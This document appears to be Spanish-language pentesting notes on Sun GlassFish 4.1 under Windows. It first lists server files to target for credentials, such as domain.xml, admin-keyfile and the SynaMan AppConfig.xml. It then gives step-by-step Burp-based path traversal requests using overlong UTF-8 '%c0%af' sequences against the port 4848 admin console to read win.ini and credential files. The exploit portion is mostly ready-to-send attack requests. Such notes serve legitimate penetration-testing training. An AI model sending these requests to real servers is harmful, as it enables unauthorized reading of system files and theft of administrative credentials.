# Sun GlassFish

Tags: #Windows #SunGlassFish 

## Archivos interesantes 
```bash 
windows/win.ini
# Confirmar que el traversal funciona en Windows

windows/System32/drivers/etc/hosts
# Buscar IPs, nombres de equipos y dominios internos

glassfish4/bin/asadmin.bat
# Confirmar la ruta de instalación de GlassFish

glassfish4/glassfish/domains/domain1/config/domain.xml
# Buscar credenciales, usuarios, JDBC, bases de datos, aplicaciones, puertos y configuración

glassfish4/glassfish/domains/domain1/config/admin-keyfile
# Buscar usuarios y datos de autenticación administrativa de GlassFish

glassfish4/glassfish/domains/domain1/config/local-password
# Buscar información de autenticación local

glassfish4/glassfish/domains/domain1/config/server.policy
# Buscar permisos y configuración de seguridad

glassfish4/glassfish/domains/domain1/config/login.conf
# Buscar mecanismos de autenticación y configuración JAAS

glassfish4/glassfish/domains/domain1/config/sun-web.xml
# Buscar configuración de aplicaciones web, roles y seguridad

glassfish4/glassfish/domains/domain1/config/logging.properties
# Buscar rutas de logs y configuración del logging

glassfish4/glassfish/domains/domain1/applications/<APP>/WEB-INF/web.xml
# Buscar usuarios, roles, endpoints y configuración de la aplicación

glassfish4/glassfish/domains/domain1/applications/<APP>/WEB-INF/glassfish-web.xml
# Buscar configuración específica de GlassFish de la aplicación

SynaMan/config/AppConfig.xml
# Buscar credenciales, usuarios, contraseñas, conexiones, rutas, tokens y otra configuración sensible de SynaMan
```

## Path Traversal - versión 4.1 
```bash 
Paso 1:
# Capturar la petición en BurpSuite en el panel de login del puerto '4848'

Paso 2:
# Confirmar el Path Traversal 
GET /theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini HTTP/1.1

NOTA:
	- Cambiar POST por GET
	- Quitar el contenido del login en el body ya que es un GET 

Paso 3:
# Buscar credenciales 
GET /theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afglassfish4/glassfish/domains/domain1/config/admin-keyfile HTTP/1.1


GET /theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afSynaMan/config/AppConfig.xml HTTP/1.1
```

